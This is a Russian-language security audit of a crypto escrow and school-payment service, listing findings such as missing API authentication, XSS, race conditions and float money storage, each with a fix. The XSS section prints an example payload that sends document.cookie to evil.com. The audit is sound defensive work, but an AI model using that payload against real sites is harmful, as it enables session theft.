#### C-2: Нет аутентификации на App 2 API

**Файл:** `app2-fiat-settlement/backend/src/index.js`

Все 11 эндпоинтов App 2 (школы, выплаты, расписания) доступны без какой-либо аутентификации. Любой, кто имеет доступ к порту 3001, может:
- Создавать и удалять школы
- Создавать выплаты и подтверждать их (что вызывает release USDC в App 1)
- Управлять расписаниями автовыплат

**Риск:** Критический в production. Злоумышленник может слить все заблокированные USDC через `POST /api/payments/:id/confirm`.

**Рекомендация:** Добавить middleware с API-ключом аналогично App 1, или JWT-аутентификацию. Минимум:

```js
function requireAuth(req, res, next) {
  const key = req.headers['x-api-key'];
  if (!key || key !== config.adminApiKey) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  next();
}
// Применить на все изменяющие эндпоинты: POST, PUT, PATCH, DELETE
```

#### C-3: XSS уязвимость в HTML-дашборде

**Файлы:** `app2-fiat-settlement/backend/public/index.html`, `payments.html`, `schools.html`

Данные из API вставляются напрямую через `innerHTML` без экранирования:

```js
// payments.html — название школы из БД
<td>${schoolMap[p.school_id] || '—'}</td>

// schools.html — название школы
select.innerHTML = schools.map(s => `<option value="${s.id}">${s.name}</option>`).join('');
```

**Сценарий атаки:** Злоумышленник создаёт школу с именем `<script>fetch('https://evil.com?key='+document.cookie)</script>`. При открытии страницы скрипт выполняется в браузере.

**Рекомендация:** Экранировать все данные перед вставкой в DOM:

```js
function escapeHtml(str) {
  return String(str ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}
// Использовать: <td>${escapeHtml(schoolMap[p.school_id])}</td>
```

#### H-1: Monetary amounts хранятся как REAL (float) в SQLite

**Файл:** `app2-fiat-settlement/backend/src/db.js`, строка 27

```sql
amount REAL NOT NULL,
```

`REAL` — это 64-битный float IEEE 754. Финансовые операции с float дают ошибки округления: `100.10 + 200.20 = 300.2999999...`. При суммировании статистики на дашборде будут появляться некорректные значения.

**Рекомендация:** Хранить суммы в целых числах (в центах/копейках):
```sql
amount INTEGER NOT NULL,  -- в минимальных единицах валюты
```
Или использовать `TEXT` и работать с decimal-библиотеками.

#### H-2: Race condition при подтверждении выплаты

**Файл:** `app2-fiat-settlement/backend/src/index.js`, строки 89–116

```js
app.post('/api/payments/:id/confirm', async (req, res) => {
  const payment = getPayment(db, req.params.id);
  if (payment.status === 'sent') return res.status(400).json({ error: 'Payment already sent' });
  
  // ← Между этой строкой и следующей — окно для второго запроса
  await mockSendPayment({ school, amount: payment.amount, currency: payment.currency });
  // ...
  confirmPayment(db, payment.id, { app1_released: app1Released });
```

Проверка статуса и обновление не атомарны. При двух одновременных запросах оба могут пройти проверку до обновления БД, что приведёт к двойной отправке денег школе.

**Рекомендация:** Заблокировать запись до начала операции:

```js
// Сначала атомарно выставить статус 'processing'
const rows = db.prepare(
  "UPDATE payments SET status='processing' WHERE id=? AND status='pending'"
).run(req.params.id);
if (rows.changes === 0) {
  return res.status(400).json({ error: 'Payment already sent or in progress' });
}
// Теперь безопасно делать async операции
```

#### H-3: Scheduler не вызывает App 1 release

**Файл:** `app2-fiat-settlement/backend/src/scheduler.js`, строка 48–56

```js
async function runScheduledPayment(db, config, schedule) {
  await mockSendPayment({ amount: schedule.amount, currency: schedule.currency });

  const payment = createPayment(db, { ... });
  confirmPayment(db, payment.id, { app1_released: false }); // ← всегда false!
  return payment;
}
```

Расписание создаёт выплату и помечает её как `sent`, но никогда не вызывает `releaseApp1`. USDC в эскроу остаётся заблокированным навсегда для плановых выплат.

**Рекомендация:** Добавить вызов App 1, аналогично `POST /api/payments/:id/confirm`:

```js
async function runScheduledPayment(db, config, schedule) {
  await mockSendPayment({ ... });
  const payment = createPayment(db, { ... });

  let app1Released = false;
  if (schedule.app1_payment_id) {
    try {
      await releaseApp1(config.app1Url, config.app1ApiKey, schedule.app1_payment_id);
      app1Released = true;
    } catch (err) {
      console.error(`Scheduler: App 1 release failed for schedule ${schedule.id}:`, err);
    }
  }
  confirmPayment(db, payment.id, { app1_released: app1Released });
}
```

Также нужно добавить `app1_payment_id` в таблицу `schedules` и передавать его при создании.

#### H-5: Контракт — это реестр записей, не настоящий escrow

**Файл:** `app1-crypto-treasury/contract/src/lib.rs`

Метод `lock_funds` только записывает состояние в Map. Он не принимает реальные USDC-токены на баланс контракта. Чтобы реализовать настоящий эскроу, контракт должен:
1. Принимать USDC через `ft_on_transfer` (NEP-141)
2. Хранить реальные токены
3. При `release_funds` — делать `ft_transfer` из контракта получателю

**Текущая реализация:** контракт — это только реестр статусов. USDC фактически остаются на аккаунте владельца, а не на контракте. Это значит, что "разблокировка" ничего не переводит.

**Приоритет:** Высокий для production, низкий для текущего testnet-демо.

### 🟡 СРЕДНИЕ

---

#### M-1: Нет rate limiting

Ни один из эндпоинтов не имеет ограничения частоты запросов. Атака перебором ключей на `POST /api/release` или DDoS возможны.

**Рекомендация:** Добавить `express-rate-limit`:
```js
const rateLimit = require('express-rate-limit');
app.use('/api/', rateLimit({ windowMs: 60_000, max: 100 }));
```

---

#### M-2: Нет security headers (helmet)

Оба приложения не устанавливают HTTP заголовки безопасности (Content-Security-Policy, X-Frame-Options, X-Content-Type-Options и др.).

**Рекомендация:**
```js
const helmet = require('helmet');
app.use(helmet());
```

---

#### M-3: Нет CORS-конфигурации

Express не настроен для контроля CORS. При деплое в разные домены API будет либо заблокирован браузером, либо открыт для всех.

**Рекомендация:** Добавить `cors` пакет с явным whitelist:
```js
const cors = require('cors');
app.use(cors({ origin: ['https://your-admin-panel.com'] }));
```

**Файл:** `app2-fiat-settlement/backend/data/app2.db`

Бинарный файл базы данных находится в репозитории. Он может содержать тестовые (или реальные) данные о школах и выплатах, которые попадут в историю git.

**Рекомендация:** Добавить в `.gitignore`:
```
data/*.db
data/*.db-shm
data/*.db-wal
```

#### M-5: minAmountOut = '0' при свапе — нет защиты от слиппеджа

**Файл:** `app1-crypto-treasury/backend/src/index.js`, строка 45

```js
const { amountNEAR, minAmountOut = '0' } = req.body;
```

По умолчанию свап принимает любой slippage. В условиях волатильного рынка можно потерять значительную часть при обмене.

**Рекомендация:** Обязать передавать `minAmountOut` явно, или рассчитывать его автоматически на основе текущей spot-цены с допуском 1–2%.

app.get('/api/payments', (req, res) => {

  res.json(getPaymentsPaginated(db, limit, offset));

## 4. Положительные стороны

Перечислю то, что сделано хорошо — это важно для понимания зрелости кода.

**Безопасность:**
- API-key middleware в App 1 на чувствительных эндпоинтах (`/api/release`, `/api/lock`, `/api/swap`)

- Защита от двойного release в контракте (`assert PaymentStatus::Locked`)
- Защита от дубликата payment_id в контракте

**Качество кода:**
- Чистая архитектура с разделением модулей: `config`, `wallet`, `escrow`, `swap`
- Правильная инициализация аккаунта вне обработчиков запросов
- `overflow-checks = true` в Cargo.toml — защита от переполнений в Rust
- LTO + opt-level=z — оптимизированный WASM
- Корректный паттерн near-sdk 5.x: `#[near(contract_state)]`, `near_sdk::store::UnorderedMap`
- Обходной путь для viewFunction баги в near-api-js 2.1.4 через прямой `provider.query`
- foreign_keys = ON в SQLite

**Тесты:**
- 59 тестов покрывают все ключевые сценарии
- Тесты API, unit-тесты DB, тесты payment/scheduler отдельно
- Корректное использование `jest.mock` для изоляции от NEAR-сети
- Тест на race condition `double confirm` (хотя сама логика уязвима — см. H-2)
- Правильная очистка тестовых БД в `afterEach`

**Общее:**
- Документация в README, включая known limitations
- `.env.example` файлы для обоих приложений
- Graceful shutdown (`closeDb`) в App 2

## 7. Итог

Проект прошёл огромный путь с прошлого аудита — из 25% готовности до полнофункциональной двух-сервисной системы с 59 тестами. Архитектура логичная, код читаемый, тесты качественные.

Главная задача перед любым реальным использованием — три критические проблемы: **ротация ключа (C-1), аутентификация App 2 (C-2), XSS (C-3)**. Они закрываются за несколько часов работы.
